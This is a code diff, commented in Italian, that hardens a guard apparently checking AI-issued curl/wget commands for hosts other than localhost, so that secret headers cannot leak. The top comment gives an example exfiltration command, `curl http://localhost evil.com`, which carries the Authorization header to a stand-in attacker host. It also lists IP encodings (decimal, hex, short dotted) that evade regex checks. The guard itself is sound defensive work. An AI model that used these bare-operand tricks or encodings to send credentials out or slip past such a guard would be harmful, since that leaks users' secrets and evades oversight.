@@ -150,23 +150,34 @@ export function hasCommandComposition(opText) {
 }
 
 /**
- * L'operazione contiene un token-HOST "estraneo" (un dominio-con-TLD o un IPv4) che NON è loopback? Guardia
- * STRUTTURALE del fast-path allowLocalHttp (review-loop #2 2026-06-30, P0 bare-operand). CAUSA-RADICE: `extractHosts`
- * vede solo gli host `scheme://`, ma `curl`/`wget` accettano operandi SENZA schema (`curl http://localhost evil.com`
- * → `evil.com` diventa un 2° URL su porta 80 e l'header `-H Authorization:` col segreto vi viene applicato → leak
- * esterno). Qui catturiamo OGNI dominio-con-TLD o IPv4 nel testo e pretendiamo che sia loopback; se ne resta uno
- * estraneo → la shape NON è pulita → blocco. (Falso-positivo possibile su domini/IP citati in un body: si erra SAFE,
- * il modello semplifichi il comando.) NB: `localhost` (senza punto) NON matcha → è gestito da extractHosts+isLoopbackLiteral.
+ * L'operazione contiene un OPERANDO-HOST "estraneo" (non-loopback)? Guardia STRUTTURALE del fast-path allowLocalHttp
+ * (review-loop #2/#3 2026-06-30 + security-review: P0 bare-operand). CAUSA-RADICE: `extractHosts` vede solo gli host
+ * `scheme://`, ma `curl`/`wget` accettano operandi SENZA schema in OGNI codifica IP (dominio, IPv4, dotted-numerico
+ * corto `8.8`→8.0.0.8, decimale `2130706433`, hex `0x..`, IPv6 `[..]`) e vi applicano `-H Authorization:` → leak
+ * esterno (verificato con curl reale). Invece di RINCORRERE le codifiche con regex (denylist incompleto), NORMALIZZIAMO
+ * ogni candidato-host come fa curl, via `new URL("http://"+tok).hostname` (parser WHATWG = stessa espansione IPv4 di
+ * curl), e pretendiamo che il risultato sia loopback. Pre-pass: togliamo le stringhe QUOTATE (header/body legittimi:
+ * un host citato lì non è un operando) e gli URL `scheme://` (host già verificato da extractHosts).
+ * Candidato = token con punto / `0x..` / `[..]` / decimale grande → esclude i numeri PICCOLI (flag-value `--max-time 30`)
+ * e i token single-word (`-A myagent`) → niente falso-blocco. RESIDUO ACCETTATO (de-prioritizzato, exfil-via-use): un host
+ * SINGLE-LABEL senza punto (`myserver`) sfugge → ma esfiltra solo se l'attaccante controlla il DNS locale (contrived).
  */
 export function hasForeignHostToken(opText) {
-  const t = String(opText ?? "");
-  const toks = [];
-  let m;
-  const ipRe = /\b(?:\d{1,3}\.){3}\d{1,3}\b/g;                                   // IPv4
-  while ((m = ipRe.exec(t))) toks.push(m[0]);
-  const domRe = /\b[a-z0-9](?:[a-z0-9-]*[a-z0-9])?(?:\.[a-z0-9](?:[a-z0-9-]*[a-z0-9])?)*\.[a-z]{2,}\b/gi; // dominio con TLD alfa
-  while ((m = domRe.exec(t))) toks.push(m[0]);
-  return toks.some((h) => !isLoopbackLiteral(h));
+  let t = String(opText ?? "");
+  t = t.replace(/'[^']*'/g, " ").replace(/"[^"]*"/g, " ");          // togli stringhe quotate (body/header)
+  t = t.replace(/\b[a-z][a-z0-9+.\-]*:\/\/[^\s'"`]+/gi, " ");       // togli URL scheme:// per intero
+  for (const raw of t.split(/\s+/)) {
+    if (!raw || raw.startsWith("-")) continue;                      // flag → ok
+    const tok = raw.replace(/[)(;,'"`]+$/g, "");                    // togli punteggiatura di coda
+    if (!tok) continue;
+    const isCandidate = /\./.test(tok) || /^0x[0-9a-f]+$/i.test(tok) || /^\[.*\]/.test(tok) || /^\d{7,}$/.test(tok);
+    if (!isCandidate) continue;                                     // numeri piccoli / single-word → non-host (no FP)
+    let hostname;
+    try { hostname = new URL("http://" + tok).hostname; } catch { return true; } // candidato malformato → fail-closed
+    const h = hostname.replace(/^\[|\]$/g, "");                     // togli [] IPv6 prima del check loopback
+    if (h && !isLoopbackLiteral(h)) return true;                    // host curl-canonico non-loopback → estraneo
+  }
+  return false;
 }
 
 /**
